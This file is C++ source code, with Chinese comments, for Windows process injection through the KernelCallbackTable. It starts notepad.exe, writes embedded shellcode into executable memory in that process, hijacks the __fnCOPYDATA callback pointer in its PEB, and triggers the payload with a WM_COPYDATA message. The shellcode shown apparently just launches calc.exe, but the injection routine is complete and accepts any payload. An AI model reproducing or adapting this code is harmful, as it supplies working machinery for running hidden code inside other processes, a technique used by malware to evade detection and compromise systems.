
#define UNICODE
#include <windows.h>
#include <iostream>
#include "ntApi.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

HWND g_hwndTarget = NULL;
DWORD g_targetPid = 0;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);


HWND FindWindowByPid(DWORD pid) {
	g_targetPid = pid;
	g_hwndTarget = NULL;
	EnumWindows(EnumWindowsProc, 0);
	return g_hwndTarget;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
	DWORD pid = 0;
	GetWindowThreadProcessId(hwnd, &pid);
	if (pid == g_targetPid) 
	{
		/*
		g_hwndTarget = hwnd;
		return FALSE;	// 找到了，停止枚举
		*/
		if (IsWindowVisible(hwnd) && GetWindow(hwnd, GW_OWNER) == NULL) {
			g_hwndTarget = hwnd;
			return FALSE;  // 找到了，停止枚举
		}
		
	}
	return TRUE;
}

VOID kernelcallbacktable(PUCHAR payload, DWORD payloadSize)
{
	HANDLE                    hp;
	HWND                      hw;
	DWORD                     id;
	LPVOID                    cs, ds;
	SIZE_T                    wr, rd;
	PROCESS_BASIC_INFORMATION pbi;
	PEB                       peb;
	KERNELCALLBACKTABLE       kct;
	COPYDATASTRUCT            cds;
	WCHAR                     msg[] = L"Injection via KernelCallbackTable";


	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	// 启动 notepad.exe
	BOOL success = CreateProcessA(
		"C:\\Windows\\System32\\notepad.exe",  // 应用路径
		NULL,          // 命令行参数（可为空）
		NULL,          // 默认进程安全属性
		NULL,          // 默认线程安全属性
		FALSE,         // 不继承句柄
		0,             // 不创建特殊标志
		NULL,          // 使用父进程的环境变量
		NULL,          // 使用父进程的当前目录
		&si,           // STARTUPINFO
		&pi            // PROCESS_INFORMATION（包含新进程 PID 等）
	);
	if (!success)
	{
		printf("create process error %d\n", GetLastError());
		return;
	}
	id = pi.dwProcessId;

	hp = pi.hProcess;

	si.wShowWindow = SW_SHOW;

	// 先等进程初始化完再开始找，不然找不到窗口
	Sleep(3 * 1000);

	hw = FindWindowByPid(id);

	// 2. Read the PEB and existing table address
	NtQueryInformationProcess(
		hp,
		ProcessBasicInformation, 
		&pbi, 
		sizeof(pbi), 
		NULL
	);

	ReadProcessMemory(
		hp, 
		pbi.PebBaseAddress,
		&peb, 
		sizeof(peb), 
		&rd
	);

	ReadProcessMemory(
		hp, 
		peb.KernelCallbackTable,
		&kct, 
		sizeof(kct), 
		&rd
	);

	// 3. Write the payload to remote process
	cs = VirtualAllocEx(
		hp, 
		NULL, 
		payloadSize,
		MEM_RESERVE | MEM_COMMIT, 
		PAGE_EXECUTE_READWRITE
	);

	WriteProcessMemory(
		hp, 
		cs, 
		payload, 
		payloadSize, 
		&wr
	);

	printf("wpm shellcode to %p \n ", cs);

	// 4. Write the new table to remote process
	ds = VirtualAllocEx(
		hp, 
		NULL, 
		sizeof(kct),
		MEM_RESERVE | MEM_COMMIT, 
		PAGE_READWRITE
	);

	kct.__fnCOPYDATA = (ULONG_PTR)cs;

	WriteProcessMemory(
		hp, 
		ds, 
		&kct, 
		sizeof(kct), 
		&wr
	);

	// 5. Update the PEB
	WriteProcessMemory(
		hp,
		(PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
		&ds, 
		sizeof(ULONG_PTR), 
		&wr
	);

	// 6. Trigger execution of payload
	cds.dwData = 1;
	cds.cbData = lstrlen(msg) * 2;
	cds.lpData = msg;

	SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds);


	// 7. Restore original KernelCallbackTable
	WriteProcessMemory(hp,
		(PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
		&peb.KernelCallbackTable, sizeof(ULONG_PTR), &wr);

	// 关掉创建的notepad
	//TerminateProcess(pi.hProcess, 0);

	// 8. Release memory for code and data, close process
	VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
	VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
	CloseHandle(hp);
}


int kctcallbackExecute()
{
	UCHAR shellCode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
	0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
	0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
	0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
	0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
	0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
	0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
	0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
	0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
	0x65, 0x78, 0x65, 0x00
	};
	kernelcallbacktable(shellCode, sizeof(shellCode));
	return 0;
}